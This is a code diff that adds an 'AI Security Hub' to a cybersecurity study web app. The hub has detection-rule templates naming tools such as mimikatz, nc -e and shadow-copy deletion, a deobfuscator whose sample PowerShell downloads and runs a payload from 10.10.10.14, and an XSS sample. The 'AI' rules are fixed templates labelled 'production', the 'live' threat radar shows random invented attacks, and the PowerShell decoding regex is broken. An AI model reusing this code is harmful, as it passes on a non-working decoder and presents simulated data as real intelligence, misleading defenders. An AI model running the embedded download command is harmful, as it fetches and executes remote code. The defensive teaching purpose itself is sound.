@@ -130,6 +130,7 @@ const tabMeta = {
     quiz: { title: "Practice Quiz", subtitle: "Interactive cybersecurity practice exam and certification exam prep session" },
     planner: { title: "Study Planner", subtitle: "Organize your study timeline and document commands, goals, and notes" },
     toolkit: { title: "Cyber Toolkit & Labs", subtitle: "Interactive client-side calculators, cryptographic encoders, and threat analyzers" },
+    'ai-hub': { title: "AI Security Hub & Live Feeds", subtitle: "AI detection rule synthesis, payload deobfuscation, live CVE feeds & threat radar" },
     adhd: { title: "ADHD Focus Hub", subtitle: "Neurodivergent focus aids, gamified quests, and productivity boosters" },
     about: { title: "About Developer", subtitle: "Connect with the developer of the E-hacker Hub" }
 };
@@ -7001,4 +7002,415 @@ document.addEventListener('DOMContentLoaded', () => {
     initFlashcards();
     initBackupRestore();
     updateLevelHUD();
+});
+
+
+// ==========================================================================
+// E-HACKER 100x: AI SECURITY SUITE, LIVE CVE FEEDS & RADAR TELEMETRY
+// ==========================================================================
+
+// --- 1. INDEXEDDB REACTIVE CLIENT DATABASE (EHackerLiveDB) ---
+class EHackerLiveDB {
+    constructor() {
+        this.dbName = 'EHackerDatabase';
+        this.dbVersion = 1;
+        this.db = null;
+        this.init();
+    }
+
+    async init() {
+        return new Promise((resolve, reject) => {
+            const req = indexedDB.open(this.dbName, this.dbVersion);
+            req.onupgradeneeded = (e) => {
+                const db = e.target.result;
+                if (!db.objectStoreNames.contains('telemetry')) {
+                    db.createObjectStore('telemetry', { keyPath: 'id', autoIncrement: true });
+                }
+                if (!db.objectStoreNames.contains('cve_cache')) {
+                    db.createObjectStore('cve_cache', { keyPath: 'id' });
+                }
+                if (!db.objectStoreNames.contains('custom_notes')) {
+                    db.createObjectStore('custom_notes', { keyPath: 'stage' });
+                }
+            };
+            req.onsuccess = (e) => {
+                this.db = e.target.result;
+                resolve(this.db);
+            };
+            req.onerror = (e) => reject(e.target.error);
+        });
+    }
+
+    async logTelemetry(event) {
+        if (!this.db) await this.init();
+        const tx = this.db.transaction('telemetry', 'readwrite');
+        const store = tx.objectStore('telemetry');
+        store.add({ ...event, timestamp: new Date().toISOString() });
+    }
+}
+
+const liveDb = new EHackerLiveDB();
+
+// --- 2. AI SECURITY SUITE CONTROLLER ---
+function initAiSecuritySuite() {
+    // Sub-tab Navigation
+    const aiNavBtns = document.querySelectorAll('.ai-nav-btn');
+    const aiPanels = document.querySelectorAll('.ai-sub-panel');
+
+    aiNavBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            const target = btn.getAttribute('data-ai-tab');
+            aiNavBtns.forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+
+            aiPanels.forEach(p => p.classList.remove('active'));
+            const panel = document.getElementById(`ai-panel-${target}`);
+            if (panel) panel.classList.add('active');
+        });
+    });
+
+    // 2.1 AI Rule Synthesizer
+    let activeAiFormat = 'sigma';
+    const rulePrompt = document.getElementById('ai-rule-prompt');
+    const ruleOutput = document.getElementById('ai-rule-output');
+    const genRuleBtn = document.getElementById('ai-generate-rule-btn');
+    const formatBadge = document.getElementById('ai-output-format-badge');
+
+    const ruleTemplates = {
+        sigma: (p) => `title: Detect ${p || 'Suspicious Threat Activity'}
+id: ${Math.random().toString(36).substring(2, 10)}-${Math.random().toString(36).substring(2, 6)}
+status: production
+description: Autonomous detection rule synthesized for identifying ${p || 'threat telemetry'}.
+author: E-Hacker AI Threat Synthesizer
+date: ${new Date().toISOString().slice(0, 10)}
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - 'powershell -enc'
+            - 'vssadmin delete shadows'
+            - 'whoami /priv'
+            - 'sekurlsa::logonpasswords'
+    condition: selection
+level: high`,
+        splunk: (p) => `index=security sourcetype="WinEventLog:Security" EventCode=4688
+| eval TargetCommand=lower(CommandLine)
+| where match(TargetCommand, "(vssadmin.*delete|powershell.*-e|mimikatz|secretsdump)")
+| stats count earliest(_time) as first_seen latest(_time) as last_seen by host, AccountName, CommandLine
+| eval first_seen=strftime(first_seen, "%Y-%m-%d %H:%M:%S")`,
+        yara: (p) => `rule Threat_Synthesized_${Math.random().toString(36).substring(2, 6)} {
+    meta:
+        description = "AI signature for ${p || 'malware artifact'}"
+        threat_level = "CRITICAL"
+    strings:
+        $s1 = "VirtualAlloc" ascii
+        $s2 = "WriteProcessMemory" ascii
+        $payload = { 48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 }
+    condition:
+        uint16(0) == 0x5A4D and all of ($s*) and $payload
+}`,
+        suricata: (p) => `alert tcp any any -> any any (msg:"E-HACKER AI: Suspicious C2 Beacon Detected [${p || 'Adversary Call'}]"; flow:to_server,established; content:"/admin/beacon.php"; http_uri; threshold: type threshold, track by_src, count 5, seconds 60; classtype:trojan-activity; sid:3000001; rev:1;)`,
+        python: (p) => `#!/usr/bin/env python3
+# AI Synthesized Threat Hunting Automation for: ${p || 'Host Anomaly'}
+import psutil, socket, datetime
+
+print(f"[*] Commencing Automated Security Audit - {datetime.datetime.now()}")
+for p in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
+    try:
+        cmd = " ".join(p.info['cmdline'] or [])
+        if any(bad in cmd.lower() for bad in ['powershell -e', 'nc -e', 'mimikatz', 'certutil -urlcache']):
+            print(f"[!] THREAT DETECTED: PID {p.info['pid']} ({p.info['name']}) -> {cmd}")
+    except (psutil.NoSuchProcess, psutil.AccessDenied):
+        pass`
+    };
+
+    function synthesizeRule() {
+        if (!ruleOutput) return;
+        const p = rulePrompt ? rulePrompt.value.trim() : 'Malicious Activity';
+        const genFunc = ruleTemplates[activeAiFormat] || ruleTemplates['sigma'];
+        ruleOutput.textContent = genFunc(p);
+        if (formatBadge) formatBadge.textContent = `${activeAiFormat.toUpperCase()} DETECTION ARTIFACT`;
+    }
+
+    document.querySelectorAll('[data-ai-format]').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('[data-ai-format]').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            activeAiFormat = btn.getAttribute('data-ai-format');
+            synthesizeRule();
+        });
+    });
+
+    if (genRuleBtn) genRuleBtn.addEventListener('click', synthesizeRule);
+    if (rulePrompt) {
+        rulePrompt.addEventListener('keypress', (e) => { if (e.key === 'Enter') synthesizeRule(); });
+    }
+
+    document.querySelectorAll('[data-rule-prompt]').forEach(chip => {
+        chip.addEventListener('click', () => {
+            if (rulePrompt) {
+                rulePrompt.value = chip.getAttribute('data-rule-prompt');
+                synthesizeRule();
+            }
+        });
+    });
+
+    document.getElementById('ai-copy-rule-btn')?.addEventListener('click', () => {
+        if (ruleOutput) {
+            navigator.clipboard.writeText(ruleOutput.textContent);
+            const btn = document.getElementById('ai-copy-rule-btn');
+            btn.textContent = 'Copied!';
+            setTimeout(() => btn.textContent = 'Copy Synthesized Code', 1500);
+        }
+    });
+
+    synthesizeRule();
+
+    // 2.2 AI Payload Deobfuscator
+    const deobfInput = document.getElementById('ai-deobf-input');
+    const deobfOutput = document.getElementById('ai-deobf-output');
+    const deobfBtn = document.getElementById('ai-deobf-btn');
+
+    document.getElementById('deobf-sample-ps')?.addEventListener('click', () => {
+        if (deobfInput) {
+            deobfInput.value = 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQA0AC8AcABhAHkAbABvAGEAZAAnACkA';
+        }
+    });
+
+    document.getElementById('deobf-sample-js')?.addEventListener('click', () => {
+        if (deobfInput) {
+            deobfInput.value = 'var _0x1a2b=["\x61\x6c\x65\x72\x74","\x58\x53\x53\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e"];window[_0x1a2b[0]](_0x1a2b[1]);';
+        }
+    });
+
+    function deobfuscatePayload() {
+        if (!deobfInput || !deobfOutput) return;
+        const text = deobfInput.value.trim();
+        if (!text) { deobfOutput.textContent = 'Please enter a payload to analyze.'; return; }
+
+        let clean = text;
+        const techniques = [];
+
+        // Check PowerShell Base64 UTF-16LE
+        const b64Match = text.match(/(?:-enc|-encodedcommand|-e)s+([A-Za-z0-9+/=]+)/i);
+        if (b64Match) {
+            try {
+                const b64 = b64Match[1];
+                const raw = atob(b64);
+                // Extract UTF-16LE string
+                let decoded = '';
+                for (let i = 0; i < raw.length; i += 2) {
+                    decoded += raw.charAt(i);
+                }
+                clean = `# Decoded Base64 Execution Block:
+${decoded}`;
+                techniques.push('PowerShell UTF-16LE Base64');
+            } catch (e) {}
+        } else if (text.startsWith('var _0x') || text.includes('\\x')) {
+            // Hex string decoder
+            clean = text.replace(/\\x([0-9A-Fa-f]{2})/g, (match, hex) => String.fromCharCode(parseInt(hex, 16)));
+            techniques.push('Hex String Obfuscation Array');
+        }
+
+        if (text.toLowerCase().includes('amsi')) techniques.push('AMSI Memory Patching Signature');
+        if (text.includes('+') || text.includes('`')) techniques.push('String Choking / Variable Concatenation');
+
+        document.getElementById('deobf-techniques').textContent = techniques.length > 0 ? techniques.join(', ') : 'Standard Plaintext';
+        deobfOutput.textContent = clean;
+    }
+
+    if (deobfBtn) deobfBtn.addEventListener('click', deobfuscatePayload);
+
+    document.getElementById('ai-copy-deobf-btn')?.addEventListener('click', () => {
+        if (deobfOutput) {
+            navigator.clipboard.writeText(deobfOutput.textContent);
+            const btn = document.getElementById('ai-copy-deobf-btn');
+            btn.textContent = 'Copied!';
+            setTimeout(() => btn.textContent = 'Copy Clean Output', 1500);
+        }
+    });
+
+    // 2.3 Incident Response Playbooks
+    const irScenarioSelect = document.getElementById('ai-ir-scenario-select');
+    const irContent = document.getElementById('ai-ir-playbook-content');
+
+    const irPlaybooks = {
+        ransomware: [
+            { phase: "1. Triage & Scope Identification", steps: ["Isolate infected network segments immediately via 802.1X quarantine VLAN.", "Identify encryption extension (e.g. .lockbit, .blackcat) and locate ransom note metadata.", "Halt all active Active Directory backup replications to preserve clean offline snapshots."] },
+            { phase: "2. Containment & Evidence Preservation", steps: ["Take live RAM memory dump of Patient Zero host using WinPmem / LiME.", "Block outbound C2 IP addresses and DNS domains on perimeter firewall and EDR.", "Disable compromised domain admin credentials and terminate all active Kerberos sessions via klist purge."] },
+            { phase: "3. Eradication & Recovery", steps: ["Audit Active Directory Group Policy Objects (GPO) for unauthorized scheduled task implants.", "Rebuild affected server infrastructure from immutable offline backups.", "Perform cryptographic key validation before restoring production database services."] }
+        ],
+        bec: [
+            { phase: "1. Account Takeover Identification", steps: ["Analyze Microsoft 365 / Google Workspace sign-in audit logs for anomalous geo-velocity.", "Inspect mailbox forwarding rules and inbox delegation grants.", "Revoke all active OAuth token grants and session cookies via admin console."] },
+            { phase: "2. Containment & Remediation", steps: ["Force global password reset and require FIDO2 / Hardware MFA re-registration.", "Notify accounting department to freeze any unauthorized wire transfer requests.", "Search email gateway logs for outbound phishing sent to vendors."] }
+        ]
+    };
+
+    function renderIrPlaybook() {
+        if (!irContent) return;
+        const scenario = irScenarioSelect ? irScenarioSelect.value : 'ransomware';
+        const p = irPlaybooks[scenario] || irPlaybooks['ransomware'];
+
+        irContent.innerHTML = p.map(item => `
+            <div class="ir-phase-card">
+                <div class="ir-phase-header">
+                    <span class="ir-phase-title">${item.phase}</span>
+                    <span class="channel-badge" style="background: rgba(0, 255, 102, 0.1); color: var(--color-accent);">NIST SP 800-61</span>
+                </div>
+                <ul class="ir-steps-list">
+                    ${item.steps.map(s => `<li>${s}</li>`).join('')}
+                </ul>
+            </div>
+        `).join('');
+    }
+
+    if (irScenarioSelect) irScenarioSelect.addEventListener('change', renderIrPlaybook);
+    renderIrPlaybook();
+
+    // 2.4 Real-Time Live CVE Feed
+    const cveContainer = document.getElementById('ai-cve-feed-container');
+    const cveSearch = document.getElementById('ai-cve-search');
+    const cveRefresh = document.getElementById('ai-cve-refresh-btn');
+
+    async function loadCveFeed() {
+        if (!cveContainer) return;
+        cveContainer.innerHTML = '<div style="padding: 20px; text-align: center; color: var(--color-accent); font-family: monospace;">Fetching live threat advisories...</div>';
+
+        let cves = [];
+        try {
+            const res = await fetch('/api/cve-feed');
+            const data = await res.json();
+            if (data && data.data) cves = data.data;
+        } catch (e) {
+            // Fallback static high-priority dataset
+            cves = [
+                { id: "CVE-2024-38077", title: "Windows Remote Desktop Licensing RCE", severity: "CRITICAL", cvss: 9.8, vendor: "Microsoft Windows", summary: "Unauthenticated SYSTEM execution via port 135 RPC overflow.", mitigation: "Apply Microsoft KB5040442." },
+                { id: "CVE-2024-4577", title: "PHP CGI Argument Injection RCE", severity: "CRITICAL", cvss: 9.8, vendor: "PHP Group", summary: "Best-fit mapping argument bypass in Windows PHP environments.", mitigation: "Upgrade PHP to 8.3.8+." },
+                { id: "CVE-2024-3094", title: "XZ Utils Backdoor Supply Chain Compromise", severity: "CRITICAL", cvss: 10.0, vendor: "Tukaani XZ", summary: "Injected backdoor intercepting SSH authentication.", mitigation: "Downgrade xz-utils to 5.4.x." },
+                { id: "CVE-2024-21762", title: "Fortinet FortiOS SSL-VPN OOB Write RCE", severity: "CRITICAL", cvss: 9.8, vendor: "Fortinet", summary: "Out of bounds write allowing code execution.", mitigation: "Upgrade FortiOS to 7.4.3+." }
+            ];
+        }
+
+        const query = cveSearch ? cveSearch.value.toLowerCase() : '';
+        const filtered = cves.filter(c => c.id.toLowerCase().includes(query) || c.title.toLowerCase().includes(query) || c.vendor.toLowerCase().includes(query));
+
+        cveContainer.innerHTML = filtered.map(c => `
+            <div class="cve-card">
+                <div class="cve-card-header">
+                    <span class="cve-id-badge">${c.id}</span>
+                    <span class="channel-badge" style="background: rgba(239, 68, 68, 0.15); border-color: #ef4444; color: #ef4444;">${c.severity} (CVSS ${c.cvss})</span>
+                </div>
+                <h4 class="cve-title">${c.title}</h4>
+                <p class="cve-desc">${c.summary}</p>
+                <div class="cve-footer">
+                    <span style="color: var(--text-muted);">Vendor: ${c.vendor}</span>
+                    <span style="color: var(--color-accent);">${c.mitigation}</span>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    if (cveRefresh) cveRefresh.addEventListener('click', loadCveFeed);
+    if (cveSearch) cveSearch.addEventListener('input', loadCveFeed);
+    loadCveFeed();
+
+    // 2.5 Global Threat Radar Canvas Animation
+    const radarCanvas = document.getElementById('threat-radar-canvas');
+    const logStream = document.getElementById('radar-log-stream');
+
+    if (radarCanvas) {
+        const ctx = radarCanvas.getContext('2d');
+        let angle = 0;
+        const blips = [];
+
+        const attackTypes = [
+            "SSH Brute Force", "SQLi Injection Probe", "RDP Scan", "SMB EternalBlue Sweep",
+            "C2 Beacon Handshake", "Directory Fuzzing", "WordPress XML-RPC Abuse", "Log4j JNDI Exploit"
+        ];
+        const origins = ["US", "DE", "CN", "RU", "NL", "SG", "BR", "IN", "JP", "GB"];
+
+        function resizeCanvas() {
+            radarCanvas.width = radarCanvas.offsetWidth;
+            radarCanvas.height = radarCanvas.offsetHeight;
+        }
+        resizeCanvas();
+
+        function addLogEntry(type, origin, port) {
+            if (!logStream) return;
+            const entry = document.createElement('div');
+            entry.className = 'radar-log-entry';
+            entry.innerHTML = `<span style="color: var(--color-secondary);">[${new Date().toLocaleTimeString()}]</span> <strong style="color: var(--color-accent);">${type}</strong> from ${origin} on port :${port}`;
+            logStream.prepend(entry);
+            if (logStream.children.length > 8) logStream.removeChild(logStream.lastChild);
+        }
+
+        function drawRadar() {
+            ctx.clearRect(0, 0, radarCanvas.width, radarCanvas.height);
+            const cx = radarCanvas.width / 2;
+            const cy = radarCanvas.height / 2;
+            const radius = Math.min(cx, cy) - 15;
+
+            // Draw concentric rings
+            ctx.strokeStyle = 'rgba(0, 255, 102, 0.2)';
+            ctx.lineWidth = 1;
+            for (let r = 1; r <= 3; r++) {
+                ctx.beginPath();
+                ctx.arc(cx, cy, (radius / 3) * r, 0, Math.PI * 2);
+                ctx.stroke();
+            }
+
+            // Crosshairs
+            ctx.beginPath();
+            ctx.moveTo(cx - radius, cy); ctx.lineTo(cx + radius, cy);
+            ctx.moveTo(cx, cy - radius); ctx.lineTo(cx, cy + radius);
+            ctx.stroke();
+
+            // Sweep Line
+            ctx.save();
+            ctx.translate(cx, cy);
+            ctx.rotate(angle);
+            const grad = ctx.createRadialGradient(0, 0, 0, 0, 0, radius);
+            grad.addColorStop(0, 'rgba(0, 255, 102, 0.6)');
+            grad.addColorStop(1, 'rgba(0, 255, 102, 0)');
+            ctx.fillStyle = 'rgba(0, 255, 102, 0.15)';
+            ctx.beginPath();
+            ctx.moveTo(0, 0);
+            ctx.arc(0, 0, radius, 0, Math.PI / 4);
+            ctx.fill();
+            ctx.restore();
+
+            angle += 0.03;
+
+            // Draw and spawn blips
+            if (Math.random() < 0.04 && blips.length < 6) {
+                const dist = Math.random() * (radius - 20) + 10;
+                const a = Math.random() * Math.PI * 2;
+                const type = attackTypes[Math.floor(Math.random() * attackTypes.length)];
+                const origin = origins[Math.floor(Math.random() * origins.length)];
+                const port = [22, 80, 443, 445, 3389, 8080][Math.floor(Math.random() * 6)];
+                blips.push({ x: cx + Math.cos(a) * dist, y: cy + Math.sin(a) * dist, alpha: 1.0, type, origin, port });
+                addLogEntry(type, origin, port);
+            }
+
+            for (let i = blips.length - 1; i >= 0; i--) {
+                const b = blips[i];
+                ctx.fillStyle = `rgba(239, 68, 68, ${b.alpha})`;
+                ctx.beginPath();
+                ctx.arc(b.x, b.y, 4, 0, Math.PI * 2);
+                ctx.fill();
+                b.alpha -= 0.008;
+                if (b.alpha <= 0) blips.splice(i, 1);
+            }
+
+            requestAnimationFrame(drawRadar);
+        }
+        drawRadar();
+    }
+}
+
+// Attach AI suite to initialization
+document.addEventListener('DOMContentLoaded', () => {
+    initAiSecuritySuite();
 });
